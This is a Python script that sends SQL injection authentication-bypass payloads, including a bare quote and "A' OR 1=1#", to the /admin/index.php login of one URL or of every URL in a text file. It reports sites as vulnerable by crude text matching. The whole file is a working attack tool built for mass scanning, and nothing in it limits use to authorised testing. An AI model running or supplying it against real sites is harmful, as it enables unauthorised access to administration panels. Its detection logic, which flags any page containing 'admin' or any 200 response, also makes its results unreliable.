import requests
from urllib.parse import urljoin

def test_sql_injection(base_url):
    endpoint = "/admin/index.php"
    full_url = urljoin(base_url, endpoint)
    
    payloads = [
        {
            'username': "'",
            'password': 'test',
            'login': ''
        },
        {
            'username': "A' OR 1=1#",
            'password': '1',
            'login': ''
        }
    ]
    
    for payload in payloads:
        response = requests.post(full_url, data=payload)
        
        if ("Dashboard" in response.text or 
            "Welcome" in response.text or 
            "admin" in response.text or 
            (response.status_code == 200 and "invalid" not in response.text.lower())):
            print(f"Vulnerable to SQL Injection with payload: {payload}")
        else:
            print(f"Not vulnerable with payload: {payload}")
            print("Test manually.")
            print("Received response (first 500 characters):\n")
            print(response.text[:500])
            print("="*50)

def test_multiple_urls(file_path):
    with open(file_path, 'r') as file:
        urls = file.readlines()
        
    for url in urls:
        url = url.strip()
        if url:
            print(f"Testing URL: {url}")
            test_sql_injection(url)
            print("\n" + "#"*50 + "\n")

if __name__ == "__main__":
    choice = input("Choose an option (1: Test single URL, 2: Test multiple URLs from .txt file): ")
    
    if choice == '1':
        url = input("Enter the site URL: ")
        test_sql_injection(url)
    elif choice == '2':
        file_path = input("Enter the path to the .txt file containing URLs: ")
        test_multiple_urls(file_path)
    else:
        print("Invalid choice. Please enter 1 or 2.")
